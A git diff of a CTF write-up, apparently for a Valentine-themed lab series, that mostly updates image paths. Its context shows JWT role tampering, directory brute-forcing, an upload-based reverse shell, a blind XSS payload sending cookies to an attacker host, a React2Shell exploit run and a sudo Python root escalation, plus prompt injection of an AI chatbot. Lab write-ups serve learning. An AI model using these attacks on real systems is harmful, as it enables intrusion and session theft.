@@ -37,11 +37,11 @@ author: miniMinn
 I assume this challenge is easiest among easy levels.  
 We open the **Agent** chat-bot and you'd have to do some basic prompt injections to make it reveal secret codes (I basically flirt with it xD):
 
-| Flag                     | Prompt                               |
-| ------------------------ | ------------------------------------ |
-| 1. Prompt injection flag | ![[Notebook/attachments/Pasted image 20260220124735.png]] |
-| 2. System flag           | ![[Notebook/attachments/Pasted image 20260220124602.png]] |
-| 3. Final flag            | ![[Notebook/attachments/Pasted image 20260220124509.png]] |
+| Flag                     | Prompt                                                    |
+| ------------------------ | --------------------------------------------------------- |
+| 1. Prompt injection flag | ![[attachments/Pasted image 20260220124735.png]] |
+| 2. System flag           | ![[attachments/Pasted image 20260220124602.png]] |
+| 3. Final flag            | ![[attachments/Pasted image 20260220124509.png]] |
 
 ---
 
@@ -53,14 +53,16 @@ We open the **Agent** chat-bot and you'd have to do some basic prompt injections
 > My Dearest Hacker,
 > Welcome to LoverLetterLocker, where you can safely write and store your Valentine's letters. For your eyes only?
 
-First, I open the web page:
-![[Notebook/attachments/Pasted image 20260218150359.png]]
+First, I open the web page:  
 
-Before trying anything else, I registered an account and logged in as a normal user. The app says that total **2 letters** are stored in archive and each letter gets a unique number:
-![[Notebook/attachments/Pasted image 20260218150947.png]]
+![[attachments/Pasted image 20260218150359.png]]
+
+Before trying anything else, I registered an account and logged in as a normal user. The app says that total **2 letters** are stored in archive and each letter gets a unique number:  
+
+![[attachments/Pasted image 20260218150947.png]]
 
 So, I tried creating my new letter to see where it is stored. As the app says, my letter got its number **#3** (since 2 letters are already in archive, my new letter got third):
-![[Notebook/attachments/Pasted image 20260218151357.png]]
+![[attachments/Pasted image 20260218151357.png]]
 
 It means that we could access the **first** and **second** letters by the URL:
 
@@ -68,7 +70,7 @@ It means that we could access the **first** and **second** letters by the URL:
 http://10.48.167.172/letter/1
 ```
 
-![[Notebook/attachments/Pasted image 20260220124903.png]]
+![[attachments/Pasted image 20260220124903.png]]
 
 ---
 
@@ -82,35 +84,35 @@ http://10.48.167.172/letter/1
 
 This is the web page running on port `5000`:
 
-![[Notebook/attachments/Pasted image 20260218191646.png]]
+![[attachments/Pasted image 20260218191646.png]]
 
 First, I created an account and logged in as a normal user. After exploring around, one interesting thing I found was we can see what role I'm currently as:
 
-![[Notebook/attachments/Pasted image 20260218191928.png]]
+![[attachments/Pasted image 20260218191928.png]]
 
 So, I quickly `gobuster` the web to find if I can find some hidden directories:
 
-![[Notebook/attachments/Pasted image 20260218191636.png]]
+![[attachments/Pasted image 20260218191636.png]]
 
 When it found `/admin`, I opened it on the browser:
-![[Notebook/attachments/Pasted image 20260218192322.png]]
+![[attachments/Pasted image 20260218192322.png]]
 
 "403 Forbidden" means that the server understood your request but refuses to authorize access. I thought it could be related to tokens. So, I went to the browser's _Devtools > Application > Cookies_:
 
-![[Notebook/attachments/Pasted image 20260218193549.png]]
+![[attachments/Pasted image 20260218193549.png]]
 
 I copied this JWT (JSON Web Token) cookie and opened it up on [JWT Decoder](https://fusionauth.io/dev-tools/jwt-decoder). When we inspect the cookie, there's a role field: **user**. So, I directly change it to **admin**:
 
-![[Notebook/attachments/Pasted image 20260218200158.png]]
+![[attachments/Pasted image 20260218200158.png]]
 
 > Be careful include the **Signature part** of cookies when you re-enter it.
 
 With this tampered cookies, I entered it to _DevTools > Application > Cookies_ and refreshed the website:
-![[Notebook/attachments/Pasted image 20260218200815.png]]
+![[attachments/Pasted image 20260218200815.png]]
 
 I was finally recognized as a **admin** and instantly got credits. The the hidden item "ValenFlag" is now visible. When I bought it, the app presented me the flag in receipt:
 
-![[Notebook/attachments/Pasted image 20260220124338.png]]
+![[attachments/Pasted image 20260220124338.png]]
 
 ---
 
@@ -124,17 +126,17 @@ I was finally recognized as a **admin** and instantly got credits. The the hidde
 > Intelligence indicates that Cupid may have unintentionally left vulnerabilities in the system. With the holiday deadline approaching, you've been tasked with uncovering what's hidden inside the vault before it's too late.
 
 The web is running on port `5000`, and we see no interactive components:
-![[Notebook/attachments/Pasted image 20260218202527.png]]
+![[attachments/Pasted image 20260218202527.png]]
 
 So, I quickly `gobuster` the app if I can find some hidden directories with `common.txt` (using [SecLists](https://github.com/danielmiessler/SecLists)):
 
-![[Notebook/attachments/Pasted image 20260218203230.png]]
+![[attachments/Pasted image 20260218203230.png]]
 
 When it found `/robot.txt`, I opened it on browser and see that provided some credentials:
-![[Notebook/attachments/Pasted image 20260218203559.png]]
+![[attachments/Pasted image 20260218203559.png]]
 
 And, I went to that hidden directory `/cupids_secret_vault/`:
-![[Notebook/attachments/Pasted image 20260218203823.png]]
+![[attachments/Pasted image 20260218203823.png]]
 
 The app still wanted me to discover more, so I used `gobuster` again on URL path `/cupids_secret_vault/`:
 
@@ -150,10 +152,10 @@ Finished
 ```
 
 It found a new path, I opened that URL path `/cupids_secret_vault/administrator` and entered credentials as shown previously (robots.txt):
-![[Notebook/attachments/Pasted image 20260218213645.png]]
+![[attachments/Pasted image 20260218213645.png]]
 
 And we're in!
-![[Notebook/attachments/Pasted image 20260220124246.png]]
+![[attachments/Pasted image 20260220124246.png]]
 
 ---
 
@@ -167,7 +169,7 @@ And we're in!
 > As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.
 
 The web app running on port `5000` :
-![[Notebook/attachments/Pasted image 20260218214317.png]]
+![[attachments/Pasted image 20260218214317.png]]
 
 I explored a bit, chat-box is sensitized that the script injection doesn't work.
 But for the profile, choosing file was seem interesting, which it accepts any file extensions whether it's `.png`, `.html` or `.py`.
@@ -186,7 +188,7 @@ nc -lvnp 4444
 ```
 
 Once we uploaded that file, the script was successfully executed. When it's connects back to the listener, we can execute commands on the server and read the flag.txt file:
-![[Notebook/attachments/Pasted image 20260220124153.png]]
+![[attachments/Pasted image 20260220124153.png]]
 
 ---
 
@@ -197,13 +199,13 @@ Once we uploaded that file, the script was successfully executed. When it's conn
 > Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection.
 
 The web service runs on port `5000`:
-![[Notebook/attachments/Pasted image 20260219122219.png]]
+![[attachments/Pasted image 20260219122219.png]]
 
 After exploring a bit, we know that the site manually review our surveys by human:
-![[Notebook/attachments/Pasted image 20260219122442.png]]
+![[attachments/Pasted image 20260219122442.png]]
 
 By submitting surveys, we get a perfect match. The app says that our submissions are reviewed within minutes:
-![[Notebook/attachments/Pasted image 20260219123619.png]]
+![[attachments/Pasted image 20260219123619.png]]
 
 This way, we could attempt to steal moderator's session cookies by Blind XSS. I try a payload that should also extract session cookies even if `HttpOnly` is disabled at server-side:
 
@@ -213,7 +215,7 @@ fetch('http://YOUR_VPN_IP:8000/log', {method:'POST', body:JSON.stringify({url:lo
 ```
 
 I filled each field with the payload to see which field is vulnerable:
-![[Notebook/attachments/Pasted image 20260220133601.png]]
+![[attachments/Pasted image 20260220133601.png]]
 
 Before submitting it, set up a listener on the same port:
 
@@ -222,7 +224,7 @@ python -m http.server 8000
 ```
 
 Then, submit the survey and wait for a moment to see any response on the listener:
-![[Notebook/attachments/Pasted image 20260220124020.png]]
+![[attachments/Pasted image 20260220124020.png]]
 
 After waiting for a minute, it payload was executed and we retrieved the cookies (the flag)!
 
@@ -240,14 +242,14 @@ After waiting for a minute, it payload was executed and we retrieved the cookies
 
 The web service runs on port `3000`:
 
-![[Notebook/attachments/Pasted image 20260220114120.png]]
+![[attachments/Pasted image 20260220114120.png]]
 
 After exploring a bit, nothing useful was found on the interface. So, I inspected further with [Wappalyzer](https://chromewebstore.google.com/detail/gppongmhjkpfnbhagpmjfkannfbllamg?utm_source=item-share-cb) to see what techs are used on the web:
 
-![[Notebook/attachments/Pasted image 20260220115533.png]]
+![[attachments/Pasted image 20260220115533.png]]
 
 We see that the app uses **Next.js** version 16.0.6. After researching about it, I found out that it is vulnerable to recent [CVE-2025-55182](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components):
-![[Notebook/attachments/Pasted image 20260220120017.png]]
+![[attachments/Pasted image 20260220120017.png]]
 
 > [CVE-2025-55182] **React2Shell** is unauthenticated remote code execution vulnerability in React Server Components.
 
@@ -268,12 +270,12 @@ python react2shell.py -u http://<TARGET_IP>:3000 -l <YOUR_VPN_IP> -p 9001
 ```
 
 This spawns a shell on the server, where we can now discover directories and find the flags:
-![[Notebook/attachments/Pasted image 20260220131326.png]]
+![[attachments/Pasted image 20260220131326.png]]
 
 The first user flag can be found easily. But, for the root flag, you would need sudo privileges to access `/root` directory.  
 So, I inspected myself what permissions do I have with `sudo -l`:  
 
-![[Notebook/attachments/Pasted image 20260220131949.png]]
+![[attachments/Pasted image 20260220131949.png]]
 
 We can see that I'm allowed to run **Python3** as a root user without entering password. With this being, I run a Python script with sudo and gain an interactive root shell session:
 
@@ -281,5 +283,5 @@ We can see that I'm allowed to run **Python3** as a root user without entering p
 sudo python3 -c 'import os; os.system("/bin/sh")'
 ```
 
-![[Notebook/attachments/Pasted image 20260220132832.png]]
+![[attachments/Pasted image 20260220132832.png]]
 
